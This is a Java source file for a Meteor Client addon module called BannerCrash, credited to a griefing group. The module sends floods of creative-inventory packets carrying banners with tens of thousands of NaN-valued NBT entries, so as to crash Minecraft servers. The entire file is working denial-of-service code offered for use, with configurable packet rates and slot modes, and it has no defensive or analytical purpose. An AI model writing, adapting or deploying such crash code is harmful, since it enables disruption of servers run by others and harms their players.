package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import widecat.meteorcrashaddon.CrashAddon;

//created by ServerFilter | GriefUnion#8761
public class BannerCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(100)
        .min(1)
        .sliderMin(1)
        .sliderMax(1000)
        .build()
    );

    private final Setting<Integer> size = sgGeneral.add(new IntSetting.Builder()
        .name("banner-size")
        .description("How big the banner should be.")
        .defaultValue(30000)
        .min(1)
        .sliderMin(1)
        .sliderMax(50000)
        .build()
    );

    private final Setting<SlotMode> slotMode = sgGeneral.add(new EnumSetting.Builder<SlotMode>()
        .name("creative-slot-mode")
        .description("Which slot mode to use.")
        .defaultValue(SlotMode.Hotbar)
        .build()
    );

    private final Setting<Integer> slots = sgGeneral.add(new IntSetting.Builder()
        .name("slots")
        .description("How many slots to use for the books.")
        .defaultValue(1)
        .min(1)
        .sliderMin(1)
        .sliderMax(36)
        .visible(() -> slotMode.get() == SlotMode.FullInv)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build()
    );

    public BannerCrash() {
        super(CrashAddon.CATEGORY   , "banner-crash", "Attempts to crash the server by spamming banners with massive NBT.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        for (int i = 0; i < amount.get(); i++) {
            ItemStack stack = new ItemStack(Items.BLACK_BANNER);
            NbtCompound tag = new NbtCompound();
            for (int ii = 0; ii < size.get(); ii++) tag.putDouble(String.valueOf(ii), Double.NaN);
            stack.setNbt(tag);
            if (slotMode.get() == SlotMode.FullInv) {
                for (int ii = 9; ii < 9 + slots.get(); ii++) mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(ii, stack)); //mc.interactionManager.clickCreativeStack(stack, ii);
            } else if (slotMode.get() == SlotMode.Hotbar) {
                for (int ii = 36; ii < 36 + 9; ii++) mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(ii, stack)); // mc.interactionManager.clickCreativeStack(stack, ii);
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum SlotMode {
        Hotbar,
        FullInv
    }
}
